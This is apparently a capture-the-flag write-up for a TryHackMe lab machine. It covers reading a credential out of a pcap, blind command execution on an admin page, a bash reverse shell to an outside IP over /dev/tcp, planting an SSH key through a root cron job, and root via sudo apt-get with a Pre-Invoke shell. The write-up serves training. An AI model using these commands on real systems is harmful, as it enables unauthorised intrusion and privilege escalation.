## Info
### Credential
- helpdesk:cH4nG3M3_n0w
- trodd
- jack
- uzi
- netadmin

### Web
- `/mail/`
- `/login.php` 

### Pcap
- Web: `/login.php`
- Host: `development.smag.thm`


## Path
### User
1. Found `/mail/`, and give us a `.pcap`.
2. `.pcap` file reveal the hostname `development.smag.thm` and the credential `helpdesk:cH4nG3M3_n0w`
3. Add host and login at `/login.php`
```
$ cat /etc/hosts
...
# TryHackMe
10.10.51.21	development.smag.thm
```
4. The admin page shows it can execute command, but it doesn't return any result. So use `sleep 10;` to make sure it indeed executes commands.
5. Use admin page to get shell.
```
bash -c "bash -i >& /dev/tcp/10.9.5.135/13337 0>&1"; 
```
6. Found `.backups/jake_id_rsa.pub.backup`, and the crontab shows that the content of the backup file will be copied into Jake's `authorized_keys` every minute. We can put our own pub key in the backup file, then ssh as Jake.
```
# www-data
$ cat /etc/crontab
..
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
$ echo <pub key> >> jake_id_rsa.pub.backup

# local
$ ssh jake@$ip
$ whoami
jake
```
### Root
1. In `~/.viminfo`, we can see both of the user and root flags. (Unintended)
2. `sudo -l` found we can execute `apt-get`.
3. Use the command frmo GTFOBins to become root.
```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```



